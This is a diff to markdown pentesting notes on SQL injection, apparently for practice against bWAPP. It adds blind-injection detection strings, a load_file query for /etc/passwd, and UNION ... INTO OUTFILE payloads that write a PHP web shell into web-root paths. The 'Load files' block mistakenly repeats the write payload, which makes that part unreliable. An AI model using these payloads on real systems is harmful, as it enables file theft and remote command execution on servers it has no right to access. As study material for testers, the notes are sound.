@@ -7,13 +7,14 @@ mysql -u root -h ip
 # SQL injection
 
 Here are 5 types of injection to look for (source: [OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection))
+
 * Union Operator: can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.
 * Boolean: use Boolean condition(s) to verify whether certain conditions are true or false.
 * Error based: this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.
 * Out-of-band: technique used to retrieve data using a different channel (e.g., make a HTTP connection to send the results to a web server).
 * Time delay: use database commands (e.g. sleep) to delay answers in conditional queries. It is useful when attacker doesn’t have some kind of answer (result, output, or error) from the application.
 
-* All examples are based on bWAPP (free pentesting practice tool) examples.
+All examples are based on bWAPP (free pentesting practice tool) examples.
 
 ## Test for SQLi vulnerability
 * It is necessary to identify a possible SQLi entry point
@@ -158,16 +159,52 @@ Get Database version:
 
 
 ```
+## Blind SQL Injection
+
+See also: https://owasp.org/www-community/attacks/Blind_SQL_Injection
+
+### Detection of Blind SQL entry point
+
+#### TRUE/FALSE 
+
+```
+1' or 1=1# returns no erroe
+
+1' or 1=2# returns error or negative response
+```
+
+#### Time based 
+
+```
+' AND sleep(15)#
+
+Benchmark:
+
+' AND BENCHMARK(10000000,SHA1(1337))#
+```
 
 
 
 
+# Get shell from sql-injection
 
 
+## Load files
+```
+UNION SELECT 1, load_file(/etc/passwd) #
 
+http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
+shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
+```
 
+## Write files
+```
+http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
+shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
 
-
+http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
+shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
+```
 
 
 
